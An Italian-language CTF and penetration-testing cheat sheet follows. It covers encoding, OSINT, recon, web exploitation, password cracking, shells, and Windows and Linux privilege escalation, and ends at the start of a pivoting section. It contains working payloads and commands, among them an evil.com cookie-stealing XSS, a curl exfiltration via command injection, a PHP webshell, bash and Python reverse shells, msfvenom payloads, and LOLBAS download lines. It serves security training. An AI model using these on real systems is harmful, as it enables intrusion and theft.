Warm-up (Crypto, OSINT, Stego)

Punti facili in ogni CTF. Prima di buttarti su exploit complessi, risolvi questi. Sono spesso 30-40% del punteggio totale.

Crittografia & Encoding

La maggior parte delle stringhe "incomprensibili" in CTF è solo codificata (Base64, Hex, URL), non cifrata. Riconoscere la codifica è il primo passo.
  • Base64: alfanumerico + + / =, lunghezza multipla di 4
  • Hex: solo 0-9a-f, lunghezza pari
  • URL encoding: sequenze %XX
  • Unicode escape: \uXXXX
# Codifica/decodifica base64
echo -n "testo" | base64
echo "dGVzdG8=" | base64 -d

# Codifica/decodifica hex
echo -n "testo" | xxd -p
echo "746573746f" | xxd -r -p
Sempre come prima cosa quando vedi una stringa strana. Prima prova CyberChef con la funzione Magic, poi decodifica manuale.
Se Base64 non basta, prova decodifiche multiple (Base64 → Hex → Gunzip). Se non è codifica, potrebbe essere un cifrario classico (Cesare, Vigenère, XOR).

Cifrari classici

Cesare, Vigenère, XOR sono i cifrari "storici" che compaiono in CTF come riscaldamento. Non offrono sicurezza reale, ma vanno riconosciuti.
  • Cesare: 25 chiavi possibili. Brute force con dCode o CyberChef.
  • Vigenère: analisi frequenze + indice di coincidenza. Tool: dCode.
  • XOR: chiave breve → brute force con CyberChef (operazione XOR con chiave variabile).
Quando Base64/Hex falliscono e il testo sembra "quasi italiano/inglese". La presenza di pattern ripetuti suggerisce Vigenère o XOR.
Se XOR con chiave di un byte non funziona, prova chiave ripetuta su più byte (Cryptopals Set 1 ha esercizi guidati).

OSINT

In CTF OSINT significa trovare informazioni su un target (dominio, persona, organizzazione) usando solo fonti pubbliche. A volte la flag è in un metadata, in un vecchio commit GitHub, in un certificato TLS.
# Google Dorking
site:target.com filetype:pdf
inurl:admin
intitle:"index of"

# Subdomain enumeration
subfinder -d target.com -silent -o subs.txt
amass enum -passive -d target.com -o amass.txt

# Certificate Transparency (crt.sh)
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u

# Metadata foto
exiftool foto.jpg
Quando la traccia menziona un dominio, un'organizzazione, una persona, o quando ti danno un'immagine/documento.
Se trovi un dominio, passa a subdomain enumeration + crt.sh. Se trovi un'immagine, controlla metadata EXIF (GPS, autore, software).

Steganografia

Nascondere informazioni dentro altre informazioni. In CTF: immagini, audio, testo. La flag è nascosta dentro un file apparentemente innocuo.
# Analisi base (in ordine)
file immagine.png              # tipo reale
exiftool immagine.png          # metadata
binwalk immagine.png           # file appesi
strings immagine.png | less    # stringhe ASCII
zsteg -a immagine.png          # LSB analysis (PNG/BMP)
steghide info immagine.jpg     # presenza payload (JPEG)
stegseek immagine.jpg rockyou.txt  # crack passphrase
Quando ti danno un'immagine, un audio, o un file binario sospetto.
Se zsteg non trova nulla, prova binwalk -e per estrarre file appesi. Se è audio, apri in Audacity e guarda lo spettrogramma. Se è testo, cerca zero-width characters.

1. Recon & Enumeration (R1)

Passiva prima, attiva dopo. Sempre su scope autorizzato. In CTF lo scope è la macchina/il target assegnato.

Perché la recon è la fase più lunga

Il 40-60% del tempo in un engagement reale è recon. Chi bussa a caso si fa beccare; chi osserva bene entra in minuti. In CTF, 10 minuti di recon fanno risparmiare 30 minuti di tentativi a vuoto.
Costruisci una mappa: quali porte sono aperte, quali servizi girano, quali versioni, quali path nascosti, quali sottodomini. Ogni informazione orienta la fase successiva.
Sempre come primo passo dopo aver letto la traccia. Anche se pensi di sapere già dove attaccare.
Dopo la recon, passa alla fase Web (R2) se c'è un servizio HTTP, o Password (R3) se ci sono credenziali, o direttamente Shell (R4) se c'è una vulnerabilità ovvia.

Passiva vs Attiva

Passiva = nessun traffico verso il target (fonti pubbliche). Attiva = scansione diretta. Sempre passiva prima, attiva dopo. La passiva produce il 70% di ciò che serve, senza esporsi.
  • Passiva: crt.sh, subfinder, amass, assetfinder, Shodan, Censys, Google Dorking
  • Attiva: nmap, masscan, httpx, ffuf, nuclei
Passiva sempre per prima, anche solo 5 minuti. Attiva solo dopo aver identificato i target più promettenti.
Dopo la passiva, hai una lista di sottodomini e IP. Passa alla attiva con nmap sui target selezionati.

Subdomain enumeration

Un'organizzazione ha decine o centinaia di sottodomini. Alcuni sono dimenticati, di staging, o di sviluppo: spesso meno protetti del sito principale.
# Enumeration passiva multi-fonte
subfinder -d target.com -all -silent -o subs.txt
amass enum -passive -d target.com -o amass.txt
assetfinder --subs-only target.com > asset.txt

# Merge e dedupe
cat subs.txt amass.txt asset.txt | sort -u > all_subs.txt

# Certificate Transparency (crt.sh)
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u
Sempre quando hai un dominio target. In CTF spesso il dominio è fornito nella traccia o si deduce dal sito.
Dopo aver la lista, proba quali rispondono HTTP con httpx. I sottodomini "interessanti" (dev-, staging-, old-, admin-) vanno investigati per primi.

Nmap - Port scanning

Nmap è il port scanner di riferimento. Ti dice quali porte sono aperte, quali servizi girano, quali versioni. Senza questo, attacchi alla cieca.
# Scan base (sempre da qui)
nmap -sV -sC target

# Tutte le porte (veloce)
nmap -p- --min-rate 5000 -T4 target

# Aggressivo con OS detection
sudo nmap -sS -sV -sC -O -T4 target -oA scan

# Script specifici
nmap --script vuln target
nmap --script smb-enum-shares -p 139,445 target
Sempre dopo la subdomain enumeration. Prima scansione veloce (top 1000 porte), poi -p- se necessario.
Guarda l'output: 22 = SSH (prova credenziali), 80/443 = HTTP (passa a R2 Web), 445 = SMB (enumerazione share), 3306 = MySQL (prova accesso), 3389 = RDP.

Scanner veloci

Nmap è completo ma non il più veloce. Per scansioni su range grandi o in CTF con molti target, Masscan/RustScan/naabu sono più rapidi.
# Masscan (sempre con --rate!)
sudo masscan -p1-65535 203.0.113.0/24 --rate 5000 -oG masscan.gnmap

# RustScan (wrapper Nmap)
rustscan -a target -- -sV -sC

# Naabu (pipeline ProjectDiscovery)
naabu -host targets.txt -p - -rate 500 -o naabu.txt
Quando hai molti target (una /24 o più) o quando Nmap è troppo lento. Poi passi a Nmap mirato sulle porte aperte.
Dopo Masscan, estrai la lista IP:porta e passa a Nmap -sV -sC solo su quelle. Combinazione classica: Masscan veloce + Nmap mirato.

Fingerprinting

Sapere che sulla porta 443 c'è "qualcosa" non basta. Dietro una stessa porta possono girare tecnologie diverse. Il fingerprinting identifica con precisione cosa gira: web server, framework, versione.
# httpx - probe HTTP con tech detection
httpx -l subs.txt -status-code -title -tech-detect -o http.txt

# WhatWeb - database esteso di fingerprint
whatweb https://target.com

# Wappalyzer (estensione browser)
# Apri il sito, clicca l'icona, vedi tecnologie
Dopo aver identificato host web attivi. Prima di content discovery o test di vulnerabilità.
Se vedi WordPress 4.x, Apache 2.2, PHP 5 → cerca CVE specifiche per quelle versioni. Se vedi nginx moderno + React → probabilmente app custom, serve analisi manuale.

Content discovery

Un web server risponde su /, ma il sito reale ha decine o centinaia di percorsi interni: /admin, /api/v1/, /backup.zip, /.git/. Non tutti sono linkati dalla homepage.
# ffuf - directory fuzzing
ffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,403

# feroxbuster - ricorsivo
feroxbuster -u https://target -w wordlist.txt -d 3 -t 50

# gobuster - directory + estensioni
gobuster dir -u https://target -w wordlist.txt -x php,txt,bak
Dopo il fingerprinting. Sempre, perché i path nascosti sono spesso il foothold.
Per ogni 200 trovato, APRILO NEL BROWSER. Un /admin/ esposto, un /backup.zip scaricabile, un /.env leggibile è il foothold. Non lasciare nessun 200 "da guardare dopo".

Nuclei

Nuclei è un vulnerability scanner template-driven. 8.000+ template YAML per CVE note, misconfigurazioni, default credentials, endpoint esposti. Trasforma la conoscenza di vulnerabilità in verifiche riproducibili.
# Scan con tutti i template, severity medium+
nuclei -l http.txt -severity medium,high,critical -rate-limit 30 -o findings.txt

# Update template (regolarmente)
nuclei -update-templates

# Solo template di una categoria
nuclei -l http.txt -t cves/
Dopo content discovery. Sempre con --rate-limit quando entri in un nuovo scope.
Nuclei produce findings con severity. I critical/high vanno investigati per primi: spesso sono il foothold diretto. Se non trova nulla, torna a content discovery con wordlist più grandi o passa all'analisi manuale (R2).

Pipeline completa ProjectDiscovery

La pipeline standard che ogni bug hunter moderno ha come script personale. Una riga che parte dal dominio e produce findings.
subfinder -d target.com -silent | dnsx -silent | naabu -silent -p 80,443,8080,8443 | httpx -silent | nuclei -silent -severity medium,high,critical
Come primo passo in una CTF web. 30-60 minuti di runtime su target medio, output completo in una cartella.
Dall'output della pipeline: identifica i 5-10 target più promettenti e passa all'analisi manuale con Burp Suite (R2).

Cosa cercare nell'output

Sei categorie di opportunità che emergono dalla recon. Ogni categoria è un potenziale foothold.
  1. Software vecchio: Apache 2.2, PHP 5, WordPress 4.x → CVE note
  2. Configurazioni errate: bucket S3 pubblici, Elasticsearch senza auth, admin panel con default credentials
  3. Subdomain takeover: CNAME orfani verso servizi non più attivi
  4. File esposti: .env, .git/, backup, log
  5. API senza auth: Swagger UI pubblica, GraphQL introspection
  6. App custom: applicazioni proprietarie con vulnerabilità logiche
Dopo aver girato la pipeline. Ogni categoria ha un capitolo dedicato nei prossimi step.
Per file esposti (.env, .git/), scarica e analizza (spesso contengono credenziali). Per app custom, passa a R2 Web Exploitation.

2. Web Exploitation (R2)

Scope scritto obbligatorio. Exploitation senza autorizzazione è reato. In CTF lo scope è la macchina assegnata.

Perché il web è la superficie d'attacco primaria

Ogni applicazione pubblica ha un'interfaccia web. Ogni interfaccia web è una potenziale porta d'ingresso. In CTF il 70% dei foothold arriva dal web.
OWASP Top 10 è la classificazione di riferimento: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Auth Failures, Software/Data Integrity, Logging Failures, SSRF.
Sempre dopo aver identificato un servizio HTTP attivo. Il web è la prima cosa da testare.
Se trovi SQLi → dump credenziali → passa a R3 (Password) o R4 (Shell). Se trovi RCE → R4 (Shell) direttamente.

Burp Suite - Lo strumento principale

Burp è un proxy HTTP che si frappone tra browser e target. Ogni richiesta passa per Burp: la vedi, la modifichi, la rilanci. È lo strumento di lavoro quotidiano per web testing.
# Setup
1. Avvia Burp Community
2. Proxy -> Options -> 127.0.0.1:8080
3. Browser -> proxy 127.0.0.1:8080
4. Installa certificato: http://burp -> cacert.der
5. Importa in browser come CA fidata

# Schede principali
Proxy        - intercetta traffico
HTTP history - log richieste
Repeater     - modifica e rilancia
Intruder     - fuzzing parametri
Decoder      - encoding/decoding
Sempre, in ogni CTF web. Configura Burp prima di iniziare a navigare il target.
Naviga il sito con Burp attivo: ogni click popola la site map. Poi manda le richieste interessanti a Repeater per test manuali.

SQL Injection

SQLi è la vulnerabilità web più antica ancora significativa. L'applicazione costruisce query SQL concatenando input utente. L'attaccante riscrive la query.
# Test manuale
' OR 1=1--
' UNION SELECT null,null--
' AND SLEEP(5)--

# Sqlmap (automatizzato)
sqlmap -u "https://target/product?id=1" --batch
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D db -T users --dump
sqlmap -r request.txt --batch --os-shell
Quando un parametro va in query SQL (id=, user=, search=). Testa sempre con apostrofo singolo per primo.
Se SQLi funziona: dumpa le tabelle users (credenziali) → usa le credenziali per login (R3) o prova --os-shell per RCE diretto (R4).

Command Injection

Analogo di SQLi ma contro la shell di sistema. L'applicazione passa input utente a un comando shell. L'attaccante inserisce comandi aggiuntivi.
# Separatori di comando
; cat /etc/passwd
| whoami
&& id
$(cat /etc/passwd)
`id`

# Blind: time-based
; sleep 5

# Blind: out-of-band
; curl abc123.interact.sh/$(whoami)
Quando un parametro va in un comando shell (ping, nslookup, convert). Cerca funzionalità che invocano comandi di sistema.
Se command injection funziona: passa direttamente a R4 (Shell). Genera reverse shell con revshells.com per il contesto (Linux/Windows, bash/PowerShell).

LFI / Path Traversal

L'applicazione costruisce path di filesystem concatenando input utente. L'attaccante include ../ per uscire dalla directory prevista e leggere file altrove.
# Path traversal canonici
?file=../../../../etc/passwd
?file=....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Log poisoning (se include log)
# 1. Invia User-Agent con PHP: 
# 2. Includi /var/log/apache2/access.log via LFI
# 3. Chiama ?cmd=whoami
Quando un parametro accetta un nome file o path (?file=, ?page=, ?template=).
Se LFI funziona: leggi /etc/passwd per capire il sistema, /proc/self/environ per env vars, ~/.ssh/id_rsa per chiavi. Log poisoning → RCE → R4.

File Upload

Se l'applicazione accetta upload di file e li serve dal web server, l'attaccante carica una webshell e la chiama via URL. RCE immediato.
# Webshell PHP minimale
<?php system($_GET['cmd']); ?>

# Bypass comuni
shell.php.jpg              # doppia estensione
shell.php%00.jpg           # null byte (PHP vecchio)
shell.phtml, shell.php5    # estensioni alternative
Content-Type: image/jpeg   # header manipolato
GIF89a<?php ...            # polyglot con magic bytes
Ogni volta che c'è un form di upload. Anche se sembra "solo immagini".
Se upload funziona: chiama la webshell via URL (/uploads/shell.php?cmd=whoami) → RCE. Passa a R4 (Shell) per stabilizzare.

SSRF

L'applicazione server-side accetta un URL come input e va a scaricarlo. L'attaccante fornisce URL che puntano a risorse interne non raggiungibili dall'esterno.
# Target tipici SSRF
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/          # GCP
http://127.0.0.1/admin/                   # localhost
http://localhost:8080/                    # servizi interni

# Bypass filtri
http://127.1/
http://0177.0.0.1/
http://2130706433/
Quando un parametro accetta un URL (?url=, ?avatar=, ?webhook=). Sempre in ambienti cloud.
Se SSRF funziona su metadata cloud: estrai credenziali AWS/GCP → accesso a infrastruttura cloud. Se funziona su localhost: raggiungi pannelli admin interni.

IDOR / Broken Access Control

L'endpoint accede a oggetti senza verificare che appartengano all'utente autenticato. Cambiando un ID, accedi ai dati di altri.
# Cambia ID numerico
GET /api/users/42/profile → GET /api/users/43/profile

# Cambia UUID (più difficile)
# Cerca UUID altrove nel sistema (email, condivisioni, log)

# Testing con due account
# Account A: annota gli ID delle proprie risorse
# Account B: prova a inserire gli ID di A
Sempre quando vedi un parametro id=, user_id=, invoice_id=. È la vulnerabilità #1 della Top 10.
Se IDOR funziona: dumpa dati di altri utenti (email, ordini, fatture). Spesso porta a privilege escalation orizzontale o verticale.

XSS

Inietti JavaScript in una pagina del target. Il browser della vittima lo esegue credendo che provenga dal sito legittimo. Utile per rubare cookie, fare richieste autenticate, phishing on-domain.
# Payload base
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Rubare cookie
<script>fetch('https://evil.com/c?c='+document.cookie)</script>
Quando un input viene riflesso nella pagina senza encoding (reflected) o salvato e mostrato ad altri (stored).
Se XSS funziona: se la cookie non è HttpOnly, rubala e hijacka la sessione. Altrimenti usa XSS per CSRF o phishing on-domain.

3. Password Attacks (R3)

Crackare hash offline è silenzioso e potente. In CTF, se trovi un hash, questo è il capitolo che ti serve.

Perché le password sono ancora il perno

Nonostante MFA e passkey, la password resta il metodo di autenticazione più diffuso. E le password deboli restano endemiche. Il cracking offline è silenzioso: nessun log nel target.
Due macro-scenari: offline (hai hash, calcoli a casa) e online (attacchi un servizio vivo, con rate limiting). In CTF quasi sempre offline.
Quando trovi un hash nel corso di un'altra fase (SQLi dump, config file, memoria).
Se cracki la password: usala per login (SSH, web, RDP) → R4 (Shell). Se non cracki, prova altre wordlist o passa ad altri vettori.

Tipi di hash

Non tutti gli hash sono uguali. MD5/SHA1 sono veloci (miliardi/sec su GPU); bcrypt/Argon2 sono lenti (migliaia/sec). La differenza è enorme.
HashVelocitàQuando trovarlo
MD5164 miliardi/sDB applicativi vecchi
NTLM304 miliardi/sSAM, NTDS.dit, memoria
bcrypt~5k/s (cost 12)DB moderni (Django, Laravel)
Argon2id<1k/sDB recenti
Kerberos AS-REP4 miliardi/sAD, AS-REP roasting
Kerberos TGS4 miliardi/sAD, Kerberoasting
Prima di lanciare hashcat, identifica il tipo con hashid o Name-That-Hash.
Con l'algoritmo identificato, scegli la modalità hashcat giusta (-m) e parti con rockyou senza regole.

Hashcat

Il password cracker GPU di riferimento. 400+ algoritmi, sfrutta GPU, open source. Se hai una GPU decente, batte qualsiasi alternativa.
# MD5
hashcat -m 0 hash.txt rockyou.txt

# NTLM (da SAM/NTDS.dit)
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule

# bcrypt
hashcat -m 3200 hash.txt rockyou.txt

# JWT HS256
hashcat -m 16500 jwt.txt rockyou.txt

# Kerberos AS-REP
hashcat -m 18200 asrep.hash rockyou.txt

# Kerberos TGS (Kerberoasting)
hashcat -m 13100 tgs.hash rockyou.txt

# Mask attack
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?d?d?d?d

# Mostra risultati
hashcat -m <mode> hash.txt --show
Sempre quando hai hash. Parti da rockyou senza regole (veloce), poi aggiungi best64, poi OneRuleToRuleThemAll, poi mask.
Se rockyou + best64 non cracka in 10 minuti, aggiungi regole più aggressive o wordlist più grandi (weakpass). Se ancora no, è una password robusta: passa ad altri vettori.

John the Ripper

Alternativa a hashcat, CPU-first. Ha script di conversione (2john) che trasformano formati arbitrari (ZIP, PDF, SSH key) in hash crackabili.
# Dictionary attack
john --wordlist=rockyou.txt hash.txt

# Formato specifico
john --format=bcrypt --wordlist=rockyou.txt hash.txt

# Conversion scripts
zip2john file.zip > hash
ssh2john key > hash
keepass2john vault.kdbx > hash
Quando hai un file protetto da password (ZIP, PDF, SSH key, KeePass). Gli script 2john lo convertono in hash.
Dopo la conversione con 2john, passa l'hash a hashcat (più veloce su GPU). John è utile soprattutto per la conversione.

Wordlist

La qualità della wordlist determina la qualità del cracking. rockyou.txt è il dataset storico (32 milioni di password reali da un breach del 2009).
  • rockyou.txt: standard, in Kali a /usr/share/wordlists/rockyou.txt.gz
  • SecLists: github.com/danielmiessler/SecLists
  • CeWL: genera wordlist da scraping del sito target
  • cupp: wordlist mirate a profilo persona
# CeWL - genera wordlist da sito
cewl -w wordlist.txt -d 3 -m 5 https://target.com
Sempre come primo tentativo. Se il target è un'azienda italiana, aggiungi wordlist italiane (nomi, città, squadre).
Se rockyou non basta, prova CeWL sul sito target + regole Mentalist (anno, simboli, leet).

Kerberos roasting

In Active Directory, AS-REP roasting e Kerberoasting estraggono hash crackabili offline da utenti e account di servizio. Silenziosi (nessun lockout).
# AS-REP roasting
GetNPUsers.py dominio.corp/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash

# Kerberoasting
GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash

# Cracking
hashcat -m 18200 -a 0 asrep.hash rockyou.txt
hashcat -m 13100 -a 0 tgs.hash rockyou.txt -r rules/OneRuleToRuleThemAll.rule
Quando sei in una rete AD. Sempre come primo test, prima di attacchi più complessi.
Se cracki un account di servizio: usa le credenziali per accesso → R7 (AD). Se cracki un utente: cerca i suoi privilegi in BloodHound.

4. Shells & Payloads (R4)

Il foothold (comando singolo) diventa controllo stabile (shell interattiva). Il momento in cui "hai vinto" la prima parte della challenge.

Perché la shell è importante

Un singolo comando eseguito è un foothold. Una shell interattiva è controllo. La differenza è tra "ho fatto id sul server" e "posso muovermi, leggere file, eseguire comandi arbitrari".
La shell è un canale bidirezionale: invii comandi, ricevi output. Le due grandi classi sono bind shell e reverse shell.
Sempre dopo aver ottenuto esecuzione di codice (RCE) via web, SQLi --os-shell, o command injection.
Dopo la shell, stabilizza (magic dance) e passa a R5 (PrivEsc) per diventare root/SYSTEM.

Bind vs Reverse shell

Bind = target ascolta, attaccante si connette. Reverse = attaccante ascolta, target si connette outbound. La reverse domina perché il traffico outbound passa firewall/NAT.
AspettoBind shellReverse shell
Chi ascoltaTargetAttaccante
Chi si connetteAttaccanteTarget
Funziona dietro NATSolo se target espostoQuasi sempre
RilevabilitàPorta in ascolto sul targetConnessione outbound verso IP esterno
Sempre reverse shell nel 99% dei casi. Bind shell solo in LAN senza NAT.
Prepara il listener sull'attaccante, poi lancia il payload sul target.

Listener

Il listener riceve la shell. Deve essere pronto PRIMA di lanciare il payload.
# nc base
nc -lvnp 4444

# rlwrap (aggiunge history/editing)
rlwrap nc -lvnp 4444

# ncat con TLS
ncat --ssl -lvnp 4444

# pwncat-cs (auto-stabilize + post-ex)
pwncat-cs -lp 4444
Sempre, prima di lanciare il payload. Scegli nc per semplicità, pwncat per sessioni lunghe.
Dopo aver ricevuto la shell, fai la stabilization.

Reverse shell bash

Il one-liner bash è il payload più semplice e più utile su Linux. Usa /dev/tcp, una feature di bash.
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
  • -i: shell interattiva
  • >&: redirect di stdout e stderr
  • /dev/tcp/IP/PORT: apre connessione TCP (feature bash, non file reale)
  • 0>&1: redirect di stdin al descrittore 1
Quando hai command injection su Linux e bash è disponibile.
Se bash non c'è, prova sh, Python, PHP. Usa revshells.com per generare il payload giusto per il contesto.

Reverse shell Python

Python è quasi sempre presente su Linux moderno. Il payload è più lungo ma produce una shell con PTY (meno stabilization manuale).
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
Quando bash non c'è o quando vuoi una shell già semi-stabilizzata.
Dopo aver ottenuto la shell, fai il magic dance per completare la stabilization.

Stabilization (magic dance)

Una raw shell non ha PTY: niente tab completion, niente Ctrl+C, niente vim, sudo bloccato. La stabilization trasforma la raw shell in una PTY completa.
# Dentro la raw shell (Linux target)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z per backgroundare
# Sull'attaccante
stty raw -echo; fg
# (Enter Enter)

# Sulla shell remota
export TERM=xterm
stty rows <N> columns <M>
Sempre, subito dopo aver ricevuto la shell. Prima di qualsiasi comando che richieda terminale (sudo, vim).
Dopo la stabilization, esegui id, whoami, uname -a per capire chi sei e dove sei → passa a R5 (PrivEsc).

msfvenom

Genera payload standalone per ogni contesto. Utile per Windows, Android, e quando serve un eseguibile.
# EXE Windows x64 Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe

# ELF Linux shell reverse
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# JSP webshell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.jsp
Quando il contesto richiede un eseguibile (Windows, Android) o quando non hai un one-liner disponibile.
Dopo aver generato il payload, trasferiscilo sul target (upload, download, SMB) ed eseguilo con il listener già pronto.

Metasploit

Framework di exploitation completo. 4.000+ exploit, 1.500+ payload. Meterpreter è il payload di punta: in-memory, cifrato, con comandi built-in.
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <IP>
msf6 > set LPORT <PORT>
msf6 > run
Quando hai un exploit Metasploit per una vulnerabilità specifica, o quando vuoi ricevere una sessione Meterpreter da un payload standalone.
Dopo aver una sessione Meterpreter, esplora i comandi: sysinfo, getuid, hashdump, getsystem, migrate. Passa a R5 per privilege escalation.

5. Privilege Escalation (R5)

PrivEsc = trasformazione di shell low-privilege in root (Linux) o SYSTEM (Windows). 80% del lavoro è enumerazione.

Perché PrivEsc è cruciale

La shell tipicamente arriva con i privilegi del processo compromesso (www-data su Linux, IIS APPPOOL su Windows). Nessuno di questi è amministratore. PrivEsc è il salto verso il controllo totale.
Le strade sono molte: kernel exploit, misconfigurazioni file system, servizi deboli, credenziali esposte, binari abusabili. Enumerazione + sfruttamento.
Sempre dopo aver stabilizzato la shell (R4).
Dopo PrivEsc, hai root/SYSTEM. Passa a R6 (Pivoting) se sei in una rete, o R7 (AD) se sei in dominio.

Linux enum manuale

Prima di automazione, fai almeno una volta l'enum manuale. Insegna cosa cercano i tool e perché. Su un sistema sconosciuto richiede 30-60 minuti.
# Identità
id; whoami; uname -a; cat /etc/os-release

# Sudo
sudo -l

# SUID
find / -perm -u=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab; ls -la /etc/cron.*

# File scrivibili
find / -writable -type d 2>/dev/null | grep -v proc
find / -perm -o+w -type f 2>/dev/null | grep -E "(passwd|shadow|sudoers)"

# Servizi locali
ss -tlnp

# History
cat ~/.bash_history /root/.bash_history 2>/dev/null

# Credenziali in file
grep -rE "password|pwd|passwd" /etc /var/www 2>/dev/null | head -50
Sempre quando ottieni shell Linux. Anche se pensi di sapere già dove guardare.
Se trovi SUID o sudo senza password → GTFOBins. Se trovi cron script scrivibile → modifica per shell root. Se trovi credenziali → prova su su/ssh.

linPEAS

Automatizza l'enumerazione manuale. Output colorato con priorità (rosso = sfruttabile). Leggi prima tutto il rosso, poi il giallo.
# Download + esecuzione
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# O via web server dell'attaccante
curl http://<ATTACKER>:8080/linpeas.sh | sh
Sempre, dopo aver ottenuto shell Linux. Risparmia 30 minuti di enum manuale.
Leggi l'output con attenzione. Per ogni finding rosso/giallo, vai su GTFOBins o cerca CVE specifiche. Poi applica il sfruttamento.

SUID exploit (GTFOBins)

Un binario SUID-root mal configurato permette esecuzione privilegiata. GTFOBins cataloga ogni binario abusabile con payload pronti.
# find SUID
find . -name x -exec /bin/sh -p \;

# vim SUID
vim -c ':!/bin/sh -p'

# python SUID o con cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
Quando find / -perm -u=s trova binari non standard. Sempre consulta GTFOBins per ognuno.
Se GTFOBins non ha il binario, cerca CVE specifiche per quella versione. Se nessuno funziona, passa ad altri vettori (sudo, cron, kernel).

Sudo misconfig

sudo -l rivela quali comandi puoi eseguire come root. Casi tipici: NOPASSWD su find, vim, less, awk. Ognuno ha escape a shell.
# (root) NOPASSWD: /usr/bin/find
sudo find /etc -exec /bin/sh \;

# (root) NOPASSWD: /usr/bin/less
sudo less /etc/profile
# nel less: !sh

# (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/sh")}'
Sempre dopo sudo -l. Ogni comando permesso va verificato su GTFOBins sezione "Sudo".
Se sudo non ha escape, controlla se la variabile env_keep include LD_PRELOAD (compili .so custom). Se no, passa a cron/PATH.

Cron / PATH / Wildcard

Script eseguiti da cron come root, ma scrivibili da utenti normali. PATH hijacking: script invoca comando senza path assoluto. Wildcard injection: tar con *.
# Cron job writable
echo '/bin/bash -c "cp /bin/bash /tmp/rb; chmod +s /tmp/rb"' >> /opt/scripts/backup.sh
# Aspetta 1 minuto
/tmp/rb -p

# PATH hijacking
echo '#!/bin/sh' > /home/user/bin/cat
echo '/bin/bash -p' >> /home/user/bin/cat
chmod +x /home/user/bin/cat

# Wildcard injection (tar -czf backup.tar.gz *)
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
Quando linPEAS segnala cron job scrivibili o script in PATH modificabili.
Se cron funziona, aspetti 1 minuto e hai root. Se PATH funziona, aspetti che lo script venga lanciato. Se no, passa a kernel exploit.

Windows enum

Windows ha un modello di privilegi diverso (SYSTEM > Administrator > utente). I vettori sono diversi da Linux.
# Identità e privilegi
whoami /priv /groups /all

# Sistema
systeminfo
wmic qfe get HotFixID,InstalledOn

# Servizi
sc query
sc qc <service>

# Scheduled tasks
schtasks /query /fo LIST /v

# Credenziali in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
Sempre quando ottieni shell Windows.
Se whoami /priv mostra SeImpersonatePrivilege → Potato attacks. Se AlwaysInstallElevated = 1 → MSI come SYSTEM. Se servizio con path non quotato → injection.

winPEAS / PowerUp

Automatizzano l'enumerazione Windows. winPEAS come linPEAS, PowerUp con funzioni specifiche per privesc.
# winPEAS
winpeasx64.exe
winpeas.bat

# PowerUp
Set-ExecutionPolicy Bypass -Scope Process
. .\PowerUp.ps1
Invoke-AllChecks
Sempre dopo aver ottenuto shell Windows. WinPEAS per enum generale, PowerUp per privesc specifico.
Leggi l'output evidenziato. Ogni finding ha uno sfruttamento associato in PowerUp o in HackTricks.

Token impersonation (SeImpersonate)

SeImpersonatePrivilege permette di impersonare processi più privilegiati. Potato attacks (JuicyPotato, PrintSpoofer, RoguePotato, GodPotato) sfruttano questo privilegio.
# GodPotato (2026, Windows recenti)
GodPotato.exe -cmd "cmd /c whoami"
# Output: nt authority\system
Quando whoami /priv mostra SeImpersonatePrivilege (comune su IIS APPPOOL, MSSQL service).
Dopo SYSTEM, dumpa SAM/NTDS.dit con secretsdump. Passa a R7 (AD) se sei in dominio.

LOLBAS

Binari Microsoft trusted (firmati) che possono essere abusati per esecuzione, download, bypass AppLocker.
  • mshta http://attacker/payload.hta
  • rundll32 javascript:...
  • regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll
  • certutil -urlcache -split -f http://attacker/file.exe out.exe
Quando AppLocker/WDAC blocca eseguibili non firmati. LOLBAS bypassa.
Dopo aver eseguito il payload via LOLBAS, stabilizza la shell e passa a R5 (PrivEsc).

6. Pivoting & Tunneling (R6)

Usare un host compromesso come trampolino per raggiungere altri host in reti interne segmentate.

Perché il pivoting è importante

Le reti aziendali sono segmentate: DMZ, rete utenti, rete server. La compromissione inizia in DMZ ma l'obiettivo è in profondità. Senza pivoting, il red teamer si ferma al primo host.
Il pivot instrada il traffico dell'attaccante attraverso l'host compromesso. Il firewall dice no all'IP dell'attaccante ma sì all'host interno.
Quando hai shell su un host e scopri che può raggiungere altre subnet che tu non raggiungi direttamente.
